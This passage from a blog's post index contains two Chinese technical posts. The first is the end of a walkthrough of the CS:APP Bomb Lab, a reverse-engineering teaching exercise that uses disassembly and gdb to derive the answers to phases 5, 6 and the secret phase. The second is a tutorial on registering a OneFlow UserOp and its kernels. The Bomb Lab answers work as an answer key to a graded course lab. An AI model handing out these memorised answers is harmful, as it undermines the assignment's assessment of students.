4010ac: 75 dd jne 40108b &lt;phase_5+0x29&gt; . 我们可以逐步分析每一行代码的含义，其中 %rbx 表示输入的字符串开头，在 gdb 中运行 p %rax 获得初始值是 0，那么这里相当于首先把输入字符串的第一个字符放到寄存器 %ecx 中； . 接着两行 mov 指令将 %ecx 的最低 8 位寄存器 %cl 的结果放到寄存器 %rdx 中，因为不能直接从一个寄存器到另外一个寄存器，所以中间需要一次内存的转换，最终 %rdx 里面存放了刚才获得的字符； . 下面一条指令 and $0xf,%edx 会将 %edx 在 4 位之后的值全部设为 0，因为 0xf 转换成二进制是 0b1111； . 然后程序会以地址 0x4024b0 为起点，计算移动之后的地址所指向的内容，用寄存器 %edx 进行保存，可以通过在 gdb 中访问这个地址所对应的内存，得到下面的结果 . (gdb) x /s 0x4024b0 0x4024b0 &lt;array.3449&gt;: &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot; . 最后程序会将寄存器 %edx 的低 8 位寄存器 %dl 中的值放到地址为 0x10(%rsp,%rax,1) 的内存中，接着继续遍历后续的字符，直到遍历完输入的 6 个字符为止。 . 直到此刻位置，我们仍然不清楚程序的要求，按照上面的流程，会根据输入字符的编码数字，经过一系列运算得到一个 offset，最后根据这个 offset 从一个比较长的字符串里面获得对应的字符，接下来继续跟着程序往后运行。 . 在跳出循环好，代码会进入到这个地方 . 4010ae: c6 44 24 16 00 movb $0x0,0x16(%rsp) 4010b3: be 5e 24 40 00 mov $0x40245e,%esi 4010b8: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 4010bd: e8 76 02 00 00 callq 401338 &lt;strings_not_equal&gt; 4010c2: 85 c0 test %eax,%eax 4010c4: 74 13 je 4010d9 &lt;phase_5+0x77&gt; 4010c6: e8 6f 03 00 00 callq 40143a &lt;explode_bomb&gt; . 首先获得地址为 $0x40245e 的字符串，用寄存器 %esi 保存它的起始地址，同时在 %rdi 中保存了刚才循环生成的字符串，接着调用 strings_not_equal ，通过名字可以知道它是在判断这两个字符串是否相等。 . 通过 gdb 查看以地址 $0x40245e 为起点的字符串是 . (gdb) x /s 0x40245e 0x40245e: &quot;flyers&quot; . 最终的问题就变成了要从序列中 maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you? 中选择对应位置的字符，使得最终字符是 flyers，这里存在多种选择方式，比如 l 在序列中出现在了多个位置，我们可以选择第一次出现对应字符的位置。 . 重新查看上面对输入字符的运算流程，每次输入的字符被转变成二进制，最终只会保留最低的 4 位，比如输入 a=97=1100001，经过计算最后会变成 0001，这其实相当于进行 mod 16 的运算。 . 分析 flyers 分别在序列中最先出现的位置是 9, 15, 14, 5, 6, 7，如果我们都输入小写字母，那么起始点就是 96，因为在 anscii 编码中 a=97，比他小且最靠近它的 16 的倍数就是 96，所以上面的值分别加上 96 可以得到下面的结果 105, 111, 110, 101, 102, 103，再将其转换成字符可以获得最后输入的 6 个字符分别是 ionefg。 . 0x1.6 phase_6 . 第 6 阶段会比较复杂，主要考察了 linked list 这种数据结构，我们还是像之前一样，逐步分析。 . 首先进入的代码如下 . 401100: 49 89 e5 mov %rsp,%r13 401103: 48 89 e6 mov %rsp,%rsi 401106: e8 51 03 00 00 callq 40145c &lt;read_six_numbers&gt; 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; 401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt; 401128: 41 83 c4 01 add $0x1,%r12d . 先通过 read_six_numbers 读取 6 个数字，而 $rsp, $r13, $rsi 这三个寄存器里面都存放了相同的地址，可以通过在 gdb 中使用 x /6 $rsi 验证这里存放的是输入的 6 个数字的起始地址。 . mov 0x0(%r13),%eax 会将输入的第一个数字放到寄存器 $eax 中，后面会对他做 -1 的运算，然后和 0x5 比较大小，必须要比他小或相等，否则炸弹会引爆，即输入的第一个数字必须要 &lt;=6。 . 然后代码会进入到下面的地方 . 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; 401132: 44 89 e3 mov %r12d,%ebx 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 &lt;phase_6+0x51&gt; 401140: e8 f5 02 00 00 callq 40143a &lt;explode_bomb&gt; 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 &lt;phase_6+0x41&gt; . 注意到前面的代码中将 $r12d 置为 0，然后这里会 +1 和 6 进行比较，如果相等则会直接跳到地址 0x401153，说明这是在遍历输入的 6 个数。 . mov (%rsp,%rax,4),%eax 不断遍历输入的数字，此时 $rax=1，所以是把第二个数字放到寄存器 $eax 中，然后和 0x0(%rbp) 进行比较，前面我们知道 $rbp 存放了第一个数字的地址，也可以在 gdb 中进行确认，所以这是将后面输入的数字都和第一个数字比较，需要他们不等，否则就会引爆炸弹。 . 跳出这个循环之后，会进入到下面这段代码 . 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 &lt;phase_6+0x34&gt; 401123: e8 12 03 00 00 callq 40143a &lt;explode_bomb&gt; 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 &lt;phase_6+0x5f&gt; ... 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 &lt;phase_6+0x20&gt; . 首先会对 $r13 增加 4个字节，因为输入的是 int，所以这里等价于让 $r13 指向第二个输入的数字，然后跳转到地址 0x401114。 . 接着用 $eax 保留第二个数字，又跳到了第一段代码的地方，说明这里要求输入的所有数字都要 &lt;=6。 . 通过 $r12d 和 6 比较的大小来决定是否遍历完所有的数字，接着进入到上一个循环，判断后面的数字是否和当前数字相等，这里的当前数字是第二个输入的数字，所以上面的代码总结起来的需求是要输入 6 个数字，每个数字需要 &lt;=6，并且他们互相不相等。 . 然后代码会进行到下面这里 . 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 &lt;phase_6+0x6c&gt; . 注意到 0x18 在十进制下是 24，$rsi 地址在 $rsp 之后的 24个字节，刚好差了 6 个类型是 int 的输入。 . 这里会遍历输入的每一个数字，首先通过 7-num 获得结果，保存在 $edx 中，然后 mov %edx,(%rax) 将结果放回 $rax 指向的内存地址，接着 add $0x4,%rax 遍历下一个数字，所以整体流程类似于下面的代码 . int a[6] {}; for (int i; i &lt; 6; ++i) { a[i] = 7 - a[i]; } . 继续运行，会进入到下面的代码 . 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 &lt;phase_6+0x8f&gt; 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 &lt;phase_6+0x82&gt; . $rsi 初始为 0，mov (%rsp,%rsi,1),%ecx 将第一个数字放到 $ecx 中，然后和 1 进行比较，如果 &lt;=1，进入地址 0x401183 这个位置，否则往后执行，会进入 0x401176 这个地址。 . 注意到mov $0x6032d0,%edx 将地址放到寄存器 $edx 中，可以通过 x $edx 查看其中的内容如下 0x6032d0 &lt;node1&gt;: 0x0000014c，不过目前我们还不知道这个数据结构的含义。 . 继续运行到地址是 0x401176 的代码如下 . 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 &lt;phase_6+0x82&gt; 401181: eb 05 jmp 401188 &lt;phase_6+0x94&gt; 401183: ba d0 32 60 00 mov $0x6032d0,%edx 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) . $rdx 表示 node1，开始先对地址 +8，然后 $eax+1 和 $ecx 比较大小，如果小于 $ecx 则继续对 node1 地址 +8，而$ecx==6 表示输入的 6 个数字，先从第一个数字开始取。 . 通过 x/24 $rdx 可以看到下面的结果 . 0x6032d0 &lt;node1&gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 0x6032e0 &lt;node2&gt;: 0x000000a8 0x00000002 0x006032f0 0x00000000 0x6032f0 &lt;node3&gt;: 0x0000039c 0x00000003 0x00603300 0x00000000 0x603300 &lt;node4&gt;: 0x000002b3 0x00000004 0x00603310 0x00000000 0x603310 &lt;node5&gt;: 0x000001dd 0x00000005 0x00603320 0x00000000 0x603320 &lt;node6&gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 . 注意到 node1 的第三个数字即为 node2 的开始地址，说明这是一个 linked list，而第一个数字标注节点的 val，比如 node1 里面的 val 是 332。 . 总结起来就是 linked list 初始地址为 0x6032d0，用户输入的 6 个数字，首先用 7-，然后遍历每个数字，数字决定了 linked list 向后移动的次数，最后将每次取到的 node 依次放到以 0x20(%rsp) 为起始地址的内存中。 . 接着会进行下面这段代码 . 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 &lt;phase_6+0xde&gt; 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd &lt;phase_6+0xc9&gt; . 这段代码是修改每个 node 指向的内容，重新建立新的 linked list，让取到的前一个 node 指向取到的下一个 node 的地址，可以通过 mov %rdx,0x8(%rcx) 看出来，同时 add $0x8,%rax 即为不断的向后遍历 linked list。 . 最后会运行到下面这段代码 . 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp 4011df: 48 8b 43 08 mov 0x8(%rbx),%rax 4011e3: 8b 00 mov (%rax),%eax 4011e5: 39 03 cmp %eax,(%rbx) 4011e7: 7d 05 jge 4011ee &lt;phase_6+0xfa&gt; 4011e9: e8 4c 02 00 00 callq 40143a &lt;explode_bomb&gt; . 这段代码最后决定了是否会引爆炸弹，$rbx 是第一次取到的 node，0x8(%rbx) 是第二次取到的 node，这里的比较需要前一次取到的 nodel 里面的值比第二次取到的 node 中的值大，否则炸弹爆炸。 . 看到这里，要求已经很清楚了，我们需要输入 6 个数字，每个数字 7- 之后表示取 linked list 中的第几个 node，依次取出来值之后，需要降序排列，所以通过比较上面 linked list 不同 node 的值，最终需要输入的结果为 4 3 2 1 6 5。 . 0x1.7 secret_phase . 除了标准的阶段外，代码中还藏了一个秘密阶段，通过 bomb.c 的注释可以发现这个秘密，在汇编代码中也可以搜索到这个阶段，不过想要进入这个阶段并不容易，下面我们来讲一下 secret_phase. . 在汇编代码中搜索 secret_phase 会找到如何函数在 phase_defused 中，接着看看这一段代码 . 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 &lt;__isoc99_sscanf@plt&gt; 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; . 这段代码开始调用了 sscanf ，它的两个参数分别为 $esi 和 $edi，可以通过 x/s 0x402619, x/s 0x603870 查看他们的具体数值分别是 %d %d %s 和 &lt;input_strings+240&gt;: &quot;1 0&quot;，且 $eax 作为 sscanf 的返回值，结果为 2，接着要和 3 进行比较，如果不相等的话，则会跳到最后退出，这时就无法进入 secret_phase。 . 查阅一下 sscanf 函数，发现它会从一个字符串的开始位置检索特定的格式，这里检索的字符串为 &quot;1 0&quot;，格式是 %d %d %s，发现这里检索的字符串缺少最后一部分字符串输入，只有前两个数字的输入。 . 另外可以发现 &quot;1 0&quot; 是第 4 个输入，从这里知道应该再对输入一个字符串，不过具体输入什么内容还要继续往后看。 . 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; . 发现这里调用了 strings_not_equal 这个函数对输入字符串进行判断，通过 x /s 0x402622 发现结果为 DrEvil，所以我们在第 4 个输入的地方加上这个字符串即可进入到 secret_phase. . 进入 secret_phase 后需要输入一个数字，先观察下面这段代码 . 401255: e8 76 f9 ff ff callq 400bd0 &lt;strtol@plt&gt; 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c &lt;secret_phase+0x2a&gt; 401267: e8 ce 01 00 00 callq 40143a &lt;explode_bomb&gt; . 这里调用了 strtol 这个函数，对输入的字符串进行长整数的转换并返回结果，接着通过 lea -0x1(%rax),%eax 执行一个 -1 操作，然后和 0x3e8 进行比较，这里转换成十进制就是 1000，所以要求输入的数字要 &lt;=1001. . 接着发现在 secret_phase 中调用了 fun7，只需要函数返回值等于 2 即可解除炸弹，先找到 func7 对应的代码。 . 0000000000401204 &lt;fun7&gt;: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 &lt;fun7+0x34&gt; 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 &lt;fun7+0x1c&gt; 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 &lt;fun7&gt; 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d &lt;fun7+0x39&gt; 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d &lt;fun7+0x39&gt; 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 &lt;fun7&gt; 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d &lt;fun7+0x39&gt; 401238: b8 ff ff ff ff mov $0xffffffff,%eax 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq . 发现这是一个递归函数，其中返回的地方有 3 个，分别是 add %eax,%eax, mov $0x0,%eax 和 lea 0x1(%rax,%rax,1),%eax，所以递归调用 fun7，第一次返回 1，第二次 2*$eax 即可满足条件。 . 下面分析一下函数递归调用前的行为，发现有这两个地方 mov 0x8(%rdi),%rdi 和 mov 0x10(%rdi),%rdi，通过 gdb 去查看 $rdi 地址所指向的内容 x/24 $rdi，会发现这是一个二叉树，第一个是节点的值，后面分别是左子树和右子树的地址。 . 0x6030f0 &lt;n1&gt;: 0x00000024 0x00000000 0x00603110 0x00000000 0x603100 &lt;n1+16&gt;: 0x00603130 0x00000000 0x00000000 0x00000000 0x603110 &lt;n21&gt;: 0x00000008 0x00000000 0x00603190 0x00000000 0x603120 &lt;n21+16&gt;: 0x00603150 0x00000000 0x00000000 0x00000000 0x603130 &lt;n22&gt;: 0x00000032 0x00000000 0x00603170 0x00000000 0x603140 &lt;n22+16&gt;: 0x006031b0 0x00000000 0x00000000 0x00000000 . 画出二叉树的结构如下，需要返回结果是 2，那么第一次找左子树，第二次找右子树，这样第二次返回 1，第一次返回 2*ret 即可返回 2，所以最后的结果是 0x16=22。 . . 0x2 结语 . 通过本次实验流程，熟悉了汇编和寄存器相关的内容，对栈帧以及函数调用也有了更深的理解，考察了一些数据结构的内容，刚开始阅读汇编代码会比较困难，不过重要的是耐心，一行一行理解背后的原理也需要毅力，不过最后在成功地拆除了炸弹之后还是很要成就感的！ . 0x3 Reference . CS:APP3e, Bryant and O’Hallaron (cmu.edu) | 【精校中英字幕】2015 CMU 15-213 CSAPP 深入理解计算机系统 课程视频_哔哩哔哩_bilibili | 深入理解计算机系统（CS:APP) - Bomb Lab 详解 viseator’s blog | .",
            "url": "https://l1aoxingyu.github.io/blogpages/operation%20system/c/csapp/assembly/2022/02/13/csapp-bomb.html",
            "relUrl": "/operation%20system/c/csapp/assembly/2022/02/13/csapp-bomb.html",
            "date": " • Feb 13, 2022"
        }
        
    
  
    
        ,"post6": {
            "title": "如何在 OneFlow 中开发一个新的 UserOp",
            "content": "Introduction . 这篇文章主要记录了笔者学习使用 oneflow 开发 userOp 中的整个过程，将这个流程写成文章是为了进一步加深自己的学习和理解，毕竟输出才是最好的学习过程。 . 因为这篇文章是自己学习过程中的梳理，所以文章中可能会缺少一些背景知识的介绍，笔者会尽量弱化这些背景知识跟本文核心内容之间的联系，尽量用深度学习框架中都有的概念来讲解这些内容。 . 通过阅读这篇文章，你可以了解到 OneFlow 开发 UserOp 的整体流程以及流程中一些关键步骤的作用。 . 整体开发流程 . 要实现一个 Op 分为两个大的部分，分别是 Op 的注册和 kernel 的实现，Op 是用来描述逻辑上的概念，kernel 实现了具体在物理设备上的运算。所以 Op 更多会关注输入输出的参数名和 shape，计算中需要的属性等等，而 kernel 更关注在不同的设备上的具体计算流程，比如在 cpu 和 gpu 上进行计算就需要不同的实现方式。 . 所以整体上需要实现一个 Op 只需要注册号 Op，同时完成这个 Op 在不同设备下的 kernel 实现即可。不过因为在模型搭建中还需要考虑更多的问题，比如 Op 需要计算梯度，因为在深度学习中需要通过反向传播算法计算整个计算图中参数的梯度，用户只会显示构建前向图，反向图如何根据前向图进行自动构建等等，所以完成一个 Op 还需要一些额外的步骤，下面我们具体来讲一下每个流程以及其目的。 . Op 注册 . 第一步需要完成 Op 的注册，即为每个 Op 选择一个唯一的名字，这样当你使用这个名字的时候系统就知道你要调用这个 Op。同时在注册 Op 的时候还需要指定 Op 的输入、输出的参数名，属性的类型和参数名，数据 shape 的推断，参数类型的推断等，最后一个非常重要的作用是设置当前 Op 的 SBP 签名。 . SBP 是 oneflow 区别于其他框架的一个重要特性，在 oneflow 中会使用一致性视角来看待所有的张量，用于简化分布式训练，在这个视角下，整个集群会被抽象成一台机器，用户不用关系具体集群的通信细节，只需要关注逻辑上的计算即可，而在逻辑上整个集群和单卡并没有什么区别。在一致性视角下就有了 sbp 等重要概念，要了解这些内容可以查看 集群的一致性视角 - OneFlow。 . 因为一个 Op 不仅需要前向计算，还需要有梯度计算以进行反向传播，所以需要注册 Op 和 Op_grad 分别用于前向和反向。除此之外，还需要额外注册一个 backward Op conf，这个作用是将 Op 和 Op_grad 进行绑定，在静态图中构图时能够自动基于前向的 Op 生成反向的计算图。 . 注册 Op 的具体实现 . 前面大致介绍了 Op 的注册流程以及作用，下面以 leaky_relu 为例进行简要说明。首先通过宏 REGISTER_USER_OP 对 Op 进行注册，在注册过程中会返回一个 OpRegistry 对象，可以通过对个对象的方法进行调用来设置 Op 的属性。 . 设定输入，输出和属性 . REGISTER_USER_OP(&quot;leaky_relu&quot;) .Input(&quot;x&quot;) .Output(&quot;y&quot;) .Attr&lt;float&gt;(&quot;alpha&quot;) . 通过 Input(&quot;x&quot;) 和 Output(&quot;y&quot;) 设置了输入和输出的参数名，Attr&lt;float&gt;(&quot;alpha&quot;) 则设置了数据类型是 float 的参数 alpha。 . 检查 TensorDesc 的合法性 . .SetTensorDescInferFn([](user_op::InferContext* ctx) -&gt; Maybe&lt;void&gt; { const Shape&amp; x_shape = ctx-&gt;InputShape(&quot;x&quot;, 0); Shape* y_shape = ctx-&gt;OutputShape(&quot;y&quot;, 0); *y_shape = x_shape; return Maybe&lt;void&gt;::Ok(); }) . SetTensorDescInferFn 通过注册回调函数对数据描述进行检查，这里通过输入的 shape 给输出指定 shape 以分配对应的内存。常规的 Op 只需要写一个回调函数，内部会调用 logical 和 physical 的推导设置为同一套，而有一些复杂的 Op 则需要分别写 logical 和 physical 的相同推导。 . 设置和推理输出数据类型 . .SetDataTypeInferFn([](user_op::InferContext* ctx) -&gt; Maybe&lt;void&gt; { *ctx-&gt;OutputDType(&quot;y&quot;, 0) = ctx-&gt;InputDType(&quot;x&quot;, 0); return Maybe&lt;void&gt;::Ok(); }); . 因为是激活函数，所以设置输出的数据类型和输入一致即可。 . 设置 SBP Signature . .SetGetSbpFn([](user_op::SbpContext* ctx) -&gt; Maybe&lt;void&gt; { const user_op::TensorDesc&amp; x_tensor = ctx-&gt;LogicalTensorDesc4InputArgNameAndIndex(&quot;x&quot;, 0); FOR_RANGE(int64_t, i, 0, x_tensor.shape().NumAxes()) { ctx-&gt;NewBuilder().Split(user_op::OpArg(&quot;x&quot;, 0), i).Split(user_op::OpArg(&quot;y&quot;, 0), i).Build(); } return Maybe&lt;void&gt;::Ok(); }) . 在 sbp signature 的设置中，默认支持 broadcast，如果一下支持其他类型的输入和输出，则需要手工进行设置，比如对于上面的 leaky_relu 激活函数，支持在输入和输出的任意维度进行 split，所以可以通过一个在 Axes 上的循环建立不同的 sbp signature。 . 通过上面的方式可以对前向 Op 和反向 Op 进行注册，最后还需要通过宏 REGISTER_USER_OP_GRAD 注册 Op_grad，通过回调函数 SetGenBackwardOpConfFn 将前向 Op 和反向 Op 绑定起来，这样在静态图构建前向图时能够自动构建反向图。 . 实现 Kernel 计算 . Kernel 是实际计算的控制单元，决定了用什么物理设备进行计算，针对什么样的数据类型以及用哪一种计算方式进行计算，所以我们需要实现在 cpu 和 gpu 下的计算流程，最终实现同一个 Op 可以根据情况使用不同的设备进行计算。 . Kernel 计算的具体实现 . Kernel 的注册和 Op 类似，通过 REGISTER_USER_KERNEL 进行注册，在注册之前，需要完成实际的计算过程。 . Kernel 都需要继承 user_op::OpKernel 这个类，通过 override Compute 方法实现具体的计算过程，以 leaky_relu 为例。 . void Compute(user_op::KernelComputeContext* ctx) const override { const user_op::Tensor* x = ctx-&gt;Tensor4ArgNameAndIndex(&quot;x&quot;, 0); user_op::Tensor* y = ctx-&gt;Tensor4ArgNameAndIndex(&quot;y&quot;, 0); const int32_t elem_cnt = x-&gt;shape().elem_cnt(); const float alpha = ctx-&gt;Attr&lt;float&gt;(&quot;alpha&quot;); const T* x_ptr = x-&gt;dptr&lt;T&gt;(); T* y_ptr = y-&gt;mut_dptr&lt;T&gt;(); FOR_RANGE(int32_t, i, 0, elem_cnt) { y_ptr[i] = x_ptr[i] &gt; 0 ? x_ptr[i] : x_ptr[i] * alpha; } } . 整个计算过程如下： . 获得输入的 tensor “x” 和 输出 tensor “y”，这里的参数名在注册 Op 的时候已经确定； . | 计算 x 的元素个数； . | 获得属性 alpha 的值，为一个 float 类型； . | 获得 tensor x 和 tensor y 的指针用于后续的计算； . | 遍历所有的元素，根据 leaky_relu 的公式，如果 x[i] &gt; 0 则直接返回 x[i] 的结果，否则返回 alpha * x[i]。 . | 完成 Kernel 的具体计算流程之后，可以通过下面的方式完成 Kernel 的注册，SetCreateFn 可以将这个 Kernel 具体的计算进行绑定，SetIsMatchedHob 则接受一些表达式用于对设备和数据类型的判断，比如通过 REGISTER_CPU_LEAKY_RELU_KERNEL(float) 则表示在 cpu 设备上，输出 y 的类型是 float 时，使用 CpuLeakyReluKernel&lt;float&gt; 进行计算。 . #define REGISTER_CPU_LEAKY_RELU_KERNEL(dtype) REGISTER_USER_KERNEL(&quot;leaky_relu&quot;) .SetCreateFn&lt;CpuLeakyReluKernel&lt;dtype&gt;&gt;() .SetIsMatchedHob((user_op::HobDeviceType() == DeviceType::kCPU) &amp;&amp; (user_op::HobDataType(&quot;y&quot;, 0) == GetDataType&lt;dtype&gt;::value)); REGISTER_CPU_LEAKY_RELU_KERNEL(float) REGISTER_CPU_LEAKY_RELU_KERNEL(double) . 除了需要完成 cpu 的 Kernel 之外，还需要完成 gpu 的 Kernel，整体的注册流程是类似的，不过在 gpu 实现的时候可以充分利用 cuda 编程，这里就不再展开，cuda 相关的内容后续再写成一篇或者几篇文章进行介绍。 . 完成 functional 接口 . 在 c++ 端完成了 Op 的注册和 Kernel 的实现之后，需要导出到 python 端以及 eager 模式下 autograd engine 进行使用，这是需要利用 functional 进行接口的导出，这样可以通过 oneflow._C.xxx 在 python 中对注册接口进行调用。 . 注册 functional 接口的具体操作 . functional 接口的注册主要分为三个步骤： . 为接口增加前向和反向的 Functor 实现； . | 通过 m.add_functor&lt;impl::MyOpFunctor&gt;(&quot;MyOp&quot;) 将 Functor 注册到 Functional Library 中； . | 在 functional_api.yaml 中增加接口的配置文件自动生成接口。 . | 所有的 functor 函数都在 oneflow/core/functional/impl 中，被设计成 class 或者是 struct，可以持有一个或是多个 Op。 . 在 constructor 中将 Op 都构造好，通常只需要声明好 Op 的输入和输出，属性则可以省略。 . class LeakyReluFunctor { public: LeakyReluFunctor() { op_ = CHECK_JUST(one::OpBuilder(&quot;leaky_relu&quot;).Input(&quot;x&quot;).Output(&quot;y&quot;).Build()); } private: std::shared_ptr&lt;OpExpr&gt; op_; }; . 然后实现 operator() 接口，在这个接口中完成 Op 的所有计算流程，可以是多个 Op 的组合，oneflow 通过 dispatch op 的机制来调用 Op 下面具体执行计算的 kernel 完成计算流程。 . Maybe&lt;Tensor&gt; operator()(const std::shared_ptr&lt;one::Tensor&gt;&amp; x, const float&amp; alpha) const { MutableAttrMap attrs; JUST(attrs.SetAttr&lt;float&gt;(&quot;alpha&quot;, alpha)); return OpInterpUtil::Dispatch&lt;one::Tensor&gt;(*op_, {x}, attrs); } . 在 functional_api.yaml 中增加接口配置文件时，每个接口信息由三个字段组成，示例如下 . - name: &quot;xxx&quot; signature: &quot;R(Args...) =&gt; Func&quot; bind_python: True or False . 其中 name 表示导出到 python 接口的名字，signature 指定了接口函数的签名，签名需要和之前定义的 functor 一致，同时 Func 作为 signature 的函数名，需要和签名注册到 function library 中的函数名一致，因为需要在 c++ 中使用的是这个函数名。 . bind_python 表示是否需要为当前的接口生成 python 接口，所有的前向接口都会在 python 搭建模型中用到，所以需要导出到 python，而有的函数不会在 python 中被显示调用，比如求梯度的函数，只会在 c++ 中 autograd 用到，这时就可以不为这种函数增加 python 的接口。 . 注册 eager 求导逻辑 . 是为了实现 eager 下的 backward op conf，将 eager 过程中的前向 Op 自动绑定反向 Op，所以需要再次注册 eager 下的求导逻辑，主要的代码在 oneflow/core/autograd/gradient_funcs 中。 . eager 求导逻辑的具体实现 . 首先初始化一个结构体来保存一些属性，这个结构体继承 AutoGradCaptureState，比如requires_grad, alpha 等参数。 . struct LeakyReluCaptureState : public AutoGradCaptureState { bool requires_grad; float alpha; }; . 接着需要实现一个 class 继承 OpExprGradFunction，同时需要特例化他的状态结构体 class LeakyRelu : public OpExprGradFunction&lt;LeakyReluCaptureState&gt; . 接着需要实现下面是个成员函数： . 在 Init 中完成一些初始化工作，可以根据前向 Op 的 proto 来初始化一个 attrs . Maybe&lt;void&gt; Init(const OpExpr&amp; op) override { const auto* fw_op_expr = dynamic_cast&lt;const UserOpExpr*&gt;(&amp;op); CHECK_NOTNULL_OR_RETURN(fw_op_expr); base_attrs_ = MakeAttrMapFromUserOpConf(fw_op_expr-&gt;proto()); return Maybe&lt;void&gt;::Ok(); } . 接着在 Capture 中进行输入的检查，查看是否需要对它求梯度，如果需要的话，就保存一些需要在求梯度的时候使用的内容 . Maybe&lt;void&gt; Capture(LeakyReluCaptureState* ctx, const TensorTuple&amp; inputs, const TensorTuple&amp; outputs, const AttrMap&amp; attrs) const override { CHECK_EQ_OR_RETURN(inputs.size(), 1); ctx-&gt;requires_grad = inputs.at(0)-&gt;requires_grad(); if (!ctx-&gt;requires_grad) { return Maybe&lt;void&gt;::Ok(); } ComposedAttrMap composed_attrs(attrs, base_attrs_); ctx-&gt;alpha = JUST(composed_attrs.GetAttr&lt;float&gt;(&quot;alpha&quot;)); ctx-&gt;SaveTensorForBackward(inputs.at(0)); return Maybe&lt;void&gt;::Ok(); } . Apply 是具体求导的过程，首先可以对后面传回来的梯度 out_grads 做一些检查，最后调用在 functional 中注册的接口进行梯度的具体计算，然后将结果写回 in_grads . Maybe&lt;void&gt; Apply(const LeakyReluCaptureState* ctx, const TensorTuple&amp; out_grads, TensorTuple* in_grads) const override { CHECK_EQ_OR_RETURN(out_grads.size(), 1); in_grads-&gt;resize(1); if (ctx-&gt;requires_grad) { const auto&amp; x = ctx-&gt;SavedTensors().at(0); in_grads-&gt;at(0) = JUST(functional::LeakyReluGrad(x, out_grads.at(0), ctx-&gt;alpha)); } return Maybe&lt;void&gt;::Ok(); } . 最后通过 REGISTER_OP_EXPR_GRAD_FUNCTION 注册这个 op 的梯度计算逻辑，第一个参数是之前在 user_op 注册中的名字， 第二个参数是刚才定义的类名，比如 REGISTER_OP_EXPR_GRAD_FUNCTION(&quot;leaky_relu&quot;, LeakyRelu)。 . Ending . 